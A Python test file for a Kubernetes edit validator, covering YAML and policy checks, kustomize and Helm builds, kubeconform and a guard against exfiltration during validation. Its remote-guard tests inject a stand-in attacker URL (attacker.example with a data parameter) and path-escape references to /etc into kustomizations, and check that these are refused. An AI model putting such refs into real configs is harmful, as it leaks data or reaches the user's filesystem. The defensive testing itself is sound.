"""Validator tests (Phase 2, PR 2).

Validators are pure-ish functions over (target, before, after): every check's
pass / fail / warn / skipped path, the introduced-vs-pre-existing rule (spec D4),
the UNVALIDATED contract (a skipped applicable check is never silent), and the
validation-time exfiltration guard (an edit may not introduce a remote
kustomize resource, and kustomize/helm never reach the network).

Binary-backed checks use the real kubectl/helm when present (skipped otherwise);
kubeconform is exercised through the `_run` seam.
"""

import shutil
import sys
from pathlib import Path

import pytest

BACKEND_DIR = Path(__file__).resolve().parent.parent
if str(BACKEND_DIR) not in sys.path:
    sys.path.insert(0, str(BACKEND_DIR))
MCP_DIR = BACKEND_DIR.parent.parent / "mcp"
if str(MCP_DIR) not in sys.path:
    sys.path.insert(0, str(MCP_DIR))

import desktop_validators as dv  # noqa: E402

HAS_KUBECTL = shutil.which("kubectl") is not None
HAS_HELM = shutil.which("helm") is not None

DEPLOY = """apiVersion: apps/v1
kind: Deployment
metadata:
  name: api
spec:
  replicas: {replicas}
  selector:
    matchLabels: {{app: api}}
  template:
    metadata:
      labels: {{app: api}}
    spec:
      containers:
        - name: api
          image: {image}
{extra}"""


def deploy(replicas=2, image="ghcr.io/acme/api:1.4.2", extra=""):
    return DEPLOY.format(replicas=replicas, image=image, extra=extra)


PRIV = "          securityContext:\n            privileged: true\n"


@pytest.fixture(autouse=True)
def no_kubeconform(monkeypatch):
    """Deterministic default: kubeconform absent unless a test opts in."""
    real_found = dv._found
    monkeypatch.setattr(dv, "_found", lambda tool: None if tool == "kubeconform" else real_found(tool))


def _by_name(res):
    return {c.name: c for c in res.checks}


def _write(root: Path, rel: str, text: str) -> Path:
    p = root / rel
    p.parent.mkdir(parents=True, exist_ok=True)
    p.write_text(text)
    return p


# ── basic manifest path ───────────────────────────────────────────────────────

class TestManifest:
    def test_valid_edit_passes_but_is_unvalidated_without_kubeconform(self, tmp_path):
        t = _write(tmp_path, "api.yaml", deploy())
        res = dv.validate_edit(t, deploy(), deploy(replicas=3), root=tmp_path)
        c = _by_name(res)
        assert c["yaml_parse"].status == "pass"
        assert c["k8s_shape"].status == "pass"
        assert c["policy"].status == "pass"
        assert c["diff_budget"].status == "pass"
        assert c["kubeconform"].status == "skipped"
        assert res.ok is True
        assert res.validated is False
        assert "kubeconform" in res.unvalidated_reason

    def test_yaml_syntax_error_short_circuits(self, tmp_path):
        t = _write(tmp_path, "api.yaml", deploy())
        res = dv.validate_edit(t, deploy(), "a: [unclosed\n", root=tmp_path)
        assert res.ok is False
        assert [c.name for c in res.checks] == ["yaml_parse"]
        assert res.checks[0].status == "fail"

    def test_introduced_missing_name_fails_shape(self, tmp_path):
        t = _write(tmp_path, "api.yaml", deploy())
        after = deploy().replace("  name: api\nspec", "  labels: {}\nspec")
        res = dv.validate_edit(t, deploy(), after, root=tmp_path)
        assert _by_name(res)["k8s_shape"].status == "fail"
        assert res.ok is False

    def test_non_manifest_yaml_only_generic_checks(self, tmp_path):
        t = _write(tmp_path, "config.yaml", "log_level: info\n")
        res = dv.validate_edit(t, "log_level: info\n", "log_level: debug\n", root=tmp_path)
        assert [c.name for c in res.checks] == ["yaml_parse", "diff_budget"]
        assert res.ok is True and res.validated is True

    def test_new_file(self, tmp_path):
        t = tmp_path / "new.yaml"
        res = dv.validate_edit(t, None, deploy(), root=tmp_path)
        assert res.ok is True
        assert _by_name(res)["policy"].status == "pass"

    def test_to_dict_shape(self, tmp_path):
        t = _write(tmp_path, "api.yaml", deploy())
        d = dv.validate_edit(t, deploy(), deploy(replicas=3), root=tmp_path).to_dict()
        assert set(d) == {"ok", "validated", "unvalidated_reason", "checks"}
        assert set(d["checks"][0]) == {"name", "status", "detail"}


# ── policy: introduced vs pre-existing (spec D4) ──────────────────────────────

class TestPolicy:
    def test_introduced_privileged_fails(self, tmp_path):
        t = _write(tmp_path, "api.yaml", deploy())
        res = dv.validate_edit(t, deploy(), deploy(extra=PRIV), root=tmp_path)
        p = _by_name(res)["policy"]
        assert p.status == "fail" and "privileged" in p.detail
        assert res.ok is False

    def test_pre_existing_privileged_is_warn(self, tmp_path):
        before = deploy(extra=PRIV)
        t = _write(tmp_path, "api.yaml", before)
        res = dv.validate_edit(t, before, deploy(replicas=5, extra=PRIV), root=tmp_path)
        assert _by_name(res)["policy"].status == "warn"
        assert res.ok is True

    def test_allow_privilege_escalation_fails(self, tmp_path):
        t = _write(tmp_path, "api.yaml", deploy())
        extra = "          securityContext:\n            allowPrivilegeEscalation: true\n"
        res = dv.validate_edit(t, deploy(), deploy(extra=extra), root=tmp_path)
        assert _by_name(res)["policy"].status == "fail"

    @pytest.mark.parametrize("image", ["nginx:latest", "nginx", "registry:5000/team/app"])
    def test_latest_or_untagged_image_fails(self, tmp_path, image):
        t = _write(tmp_path, "api.yaml", deploy())
        res = dv.validate_edit(t, deploy(), deploy(image=image), root=tmp_path)
        assert _by_name(res)["policy"].status == "fail", image

    @pytest.mark.parametrize("image", [
        "nginx:1.27", "registry:5000/team/app:2.0",
        "nginx@sha256:" + "a" * 64,
    ])
    def test_pinned_images_pass(self, tmp_path, image):
        t = _write(tmp_path, "api.yaml", deploy())
        res = dv.validate_edit(t, deploy(), deploy(image=image), root=tmp_path)
        assert _by_name(res)["policy"].status == "pass", image

    def test_init_containers_and_cronjob_checked(self, tmp_path):
        cron = """apiVersion: batch/v1
kind: CronJob
metadata: {name: nightly}
spec:
  schedule: "0 1 * * *"
  jobTemplate:
    spec:
      template:
        spec:
          initContainers:
            - name: init
              image: busybox:latest
          containers:
            - name: job
              image: acme/job:1.0
"""
        t = _write(tmp_path, "cron.yaml", "")
        res = dv.validate_edit(t, None, cron, root=tmp_path)
        assert _by_name(res)["policy"].status == "fail"

    def test_host_path_is_warn(self, tmp_path):
        extra = ("      volumes:\n        - name: h\n          hostPath: {path: /var/run}\n")
        t = _write(tmp_path, "api.yaml", deploy())
        res = dv.validate_edit(t, deploy(), deploy(extra=extra), root=tmp_path)
        p = _by_name(res)["policy"]
        assert p.status == "warn" and "hostPath" in p.detail
        assert res.ok is True


# ── diff budget ───────────────────────────────────────────────────────────────

def test_diff_budget_exceeded(tmp_path):
    before = "".join(f"k{i}: {i}\n" for i in range(300))
    after = "".join(f"k{i}: {i + 1}\n" for i in range(300))
    t = _write(tmp_path, "big.yaml", before)
    res = dv.validate_edit(t, before, after, root=tmp_path)
    assert _by_name(res)["diff_budget"].status == "fail"
    assert res.ok is False


# ── kustomize ─────────────────────────────────────────────────────────────────

BASE_KUST = "resources:\n  - deployment.yaml\n"
OVERLAY_KUST = "resources:\n  - ../../base\npatches:\n  - path: replicas.yaml\n"
PATCH = "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: api\nspec:\n  replicas: {n}\n"


@pytest.fixture
def kustomize_repo(tmp_path):
    root = tmp_path / "infra"
    _write(root, "base/deployment.yaml", deploy())
    _write(root, "base/kustomization.yaml", BASE_KUST)
    _write(root, "overlays/prod/kustomization.yaml", OVERLAY_KUST)
    _write(root, "overlays/prod/replicas.yaml", PATCH.format(n=3))
    return root


@pytest.mark.skipif(not HAS_KUBECTL, reason="kubectl not installed")
class TestKustomize:
    def test_valid_overlay_edit_builds(self, kustomize_repo):
        t = kustomize_repo / "overlays/prod/replicas.yaml"
        res = dv.validate_edit(t, PATCH.format(n=3), PATCH.format(n=5), root=kustomize_repo)
        assert _by_name(res)["kustomize_build"].status == "pass"

    def test_edit_that_breaks_build_fails(self, kustomize_repo):
        t = kustomize_repo / "overlays/prod/kustomization.yaml"
        broken = OVERLAY_KUST + "  - path: does-not-exist.yaml\n"
        res = dv.validate_edit(t, OVERLAY_KUST, broken, root=kustomize_repo)
        k = _by_name(res)["kustomize_build"]
        assert k.status == "fail"
        assert res.ok is False

    def test_pre_existing_broken_build_is_warn(self, kustomize_repo):
        broken = OVERLAY_KUST + "  - path: does-not-exist.yaml\n"
        (kustomize_repo / "overlays/prod/kustomization.yaml").write_text(broken)
        t = kustomize_repo / "overlays/prod/replicas.yaml"
        res = dv.validate_edit(t, PATCH.format(n=3), PATCH.format(n=4), root=kustomize_repo)
        assert _by_name(res)["kustomize_build"].status == "warn"
        assert res.ok is True

    def test_original_repo_untouched(self, kustomize_repo):
        t = kustomize_repo / "overlays/prod/replicas.yaml"
        dv.validate_edit(t, PATCH.format(n=3), PATCH.format(n=9), root=kustomize_repo)
        assert t.read_text() == PATCH.format(n=3)


class TestKustomizeRemoteGuard:
    """No network during validation: runs before any human approval."""

    def test_introducing_remote_resource_fails_without_running(self, kustomize_repo, monkeypatch):
        calls = []
        monkeypatch.setattr(dv, "_run", lambda *a, **k: calls.append(a) or (0, "", ""))
        t = kustomize_repo / "overlays/prod/kustomization.yaml"
        evil = OVERLAY_KUST.replace("  - ../../base\n", "  - ../../base\n  - https://attacker.example/x?d=abc\n")
        res = dv.validate_edit(t, OVERLAY_KUST, evil, root=kustomize_repo)
        k = _by_name(res)["kustomize_build"]
        assert k.status == "fail" and "remote" in k.detail
        assert calls == []                      # kustomize never invoked

    @pytest.mark.parametrize("escape", ["/etc", "../../../../../../../../etc", "../../.."])
    def test_introducing_ref_outside_grant_fails_without_running(self, kustomize_repo, monkeypatch, escape):
        # The build runs on a temp copy; a path escaping the copy would resolve
        # against the user's real filesystem. Refuse it before running anything.
        calls = []
        monkeypatch.setattr(dv, "_run", lambda *a, **k: calls.append(a) or (0, "", ""))
        t = kustomize_repo / "overlays/prod/kustomization.yaml"
        evil = OVERLAY_KUST.replace("  - ../../base\n", f"  - ../../base\n  - {escape}\n")
        res = dv.validate_edit(t, OVERLAY_KUST, evil, root=kustomize_repo)
        k = _by_name(res)["kustomize_build"]
        assert k.status == "fail" and "outside" in k.detail
        assert calls == []

    @pytest.mark.parametrize("ref", [
        "github.com/acme/infra//base?ref=v1", "git@github.com:acme/infra.git", "ssh://git.example/x",
    ])
    def test_remote_ref_shapes_detected(self, ref):
        assert dv._is_remote_ref(ref)

    @pytest.mark.parametrize("ref", ["../../base", "deployment.yaml", "./components/x"])
    def test_local_refs_not_remote(self, ref):
        assert not dv._is_remote_ref(ref)

    def test_pre_existing_remote_skips_build(self, kustomize_repo, monkeypatch):
        calls = []
        monkeypatch.setattr(dv, "_run", lambda *a, **k: calls.append(a) or (0, "", ""))
        remote = BASE_KUST + "  - github.com/acme/shared//base?ref=v1\n"
        (kustomize_repo / "base/kustomization.yaml").write_text(remote)
        t = kustomize_repo / "overlays/prod/replicas.yaml"
        res = dv.validate_edit(t, PATCH.format(n=3), PATCH.format(n=4), root=kustomize_repo)
        k = _by_name(res)["kustomize_build"]
        assert k.status == "skipped" and "remote" in k.detail
        assert res.validated is False
        assert calls == []

    def test_network_blocked_env(self):
        env = dv._offline_env()
        assert env["HTTPS_PROXY"].startswith("http://127.0.0.1:")
        assert env["GIT_ALLOW_PROTOCOL"] == "file"


# ── helm ──────────────────────────────────────────────────────────────────────

CHART = "apiVersion: v2\nname: api\nversion: 0.1.0\n"
TEMPLATE = """apiVersion: apps/v1
kind: Deployment
metadata:
  name: api
spec:
  replicas: {{ .Values.replicas }}
  selector: {matchLabels: {app: api}}
  template:
    metadata: {labels: {app: api}}
    spec:
      containers:
        - name: api
          image: {{ required "image is required" .Values.image }}
"""
VALUES = "replicas: 2\nimage: ghcr.io/acme/api:1.0\n"


@pytest.fixture
def chart_repo(tmp_path):
    root = tmp_path / "infra"
    _write(root, "charts/api/Chart.yaml", CHART)
    _write(root, "charts/api/values.yaml", VALUES)
    _write(root, "charts/api/templates/deployment.yaml", TEMPLATE)
    return root


class TestHelm:
    def test_missing_helm_is_skipped(self, chart_repo, monkeypatch):
        monkeypatch.setattr(dv, "_found", lambda tool: None)
        t = chart_repo / "charts/api/values.yaml"
        res = dv.validate_edit(t, VALUES, VALUES.replace("2", "3"), root=chart_repo)
        h = _by_name(res)["helm_template"]
        assert h.status == "skipped" and "helm" in h.detail
        assert res.validated is False

    @pytest.mark.skipif(not HAS_HELM, reason="helm not installed")
    def test_values_edit_renders(self, chart_repo):
        t = chart_repo / "charts/api/values.yaml"
        res = dv.validate_edit(t, VALUES, VALUES.replace("replicas: 2", "replicas: 3"), root=chart_repo)
        assert _by_name(res)["helm_template"].status == "pass"

    @pytest.mark.skipif(not HAS_HELM, reason="helm not installed")
    def test_values_edit_breaking_render_fails(self, chart_repo):
        t = chart_repo / "charts/api/values.yaml"
        res = dv.validate_edit(t, VALUES, "replicas: 2\n", root=chart_repo)
        h = _by_name(res)["helm_template"]
        assert h.status == "fail" and "image is required" in h.detail
        assert res.ok is False

    @pytest.mark.skipif(not HAS_HELM, reason="helm not installed")
    def test_template_file_is_not_yaml_parsed(self, chart_repo):
        t = chart_repo / "charts/api/templates/deployment.yaml"
        after = TEMPLATE.replace("name: api\nspec", "name: api-v2\nspec")
        res = dv.validate_edit(t, TEMPLATE, after, root=chart_repo)
        names = [c.name for c in res.checks]
        assert "yaml_parse" not in names
        assert _by_name(res)["helm_template"].status == "pass"


# ── kubeconform (through the _run seam) ───────────────────────────────────────

class TestKubeconform:
    @pytest.fixture
    def present(self, monkeypatch):
        monkeypatch.setattr(dv, "_found", lambda tool: "/usr/local/bin/" + tool)

    def test_pass(self, tmp_path, present, monkeypatch):
        monkeypatch.setattr(dv, "_run", lambda cmd, **k: (0, "", ""))
        t = _write(tmp_path, "api.yaml", deploy())
        res = dv.validate_edit(t, deploy(), deploy(replicas=3), root=tmp_path)
        assert _by_name(res)["kubeconform"].status == "pass"
        assert res.validated is True

    def test_introduced_schema_error_fails(self, tmp_path, present, monkeypatch):
        def fake(cmd, **k):
            text = Path(cmd[-1]).read_text()
            return (1, "replicas: expected integer", "") if "replicas: lots" in text else (0, "", "")
        monkeypatch.setattr(dv, "_run", fake)
        t = _write(tmp_path, "api.yaml", deploy())
        res = dv.validate_edit(t, deploy(), deploy(replicas="lots"), root=tmp_path)
        k = _by_name(res)["kubeconform"]
        assert k.status == "fail" and "expected integer" in k.detail

    def test_pre_existing_schema_error_is_warn(self, tmp_path, present, monkeypatch):
        monkeypatch.setattr(dv, "_run", lambda cmd, **k: (1, "bad", ""))
        t = _write(tmp_path, "api.yaml", deploy())
        res = dv.validate_edit(t, deploy(), deploy(replicas=3), root=tmp_path)
        assert _by_name(res)["kubeconform"].status == "warn"

    def test_timeout_is_skipped(self, tmp_path, present, monkeypatch):
        monkeypatch.setattr(dv, "_run", lambda cmd, **k: (dv.RC_TIMEOUT, "", "timed out"))
        t = _write(tmp_path, "api.yaml", deploy())
        res = dv.validate_edit(t, deploy(), deploy(replicas=3), root=tmp_path)
        assert _by_name(res)["kubeconform"].status == "skipped"
        assert res.validated is False
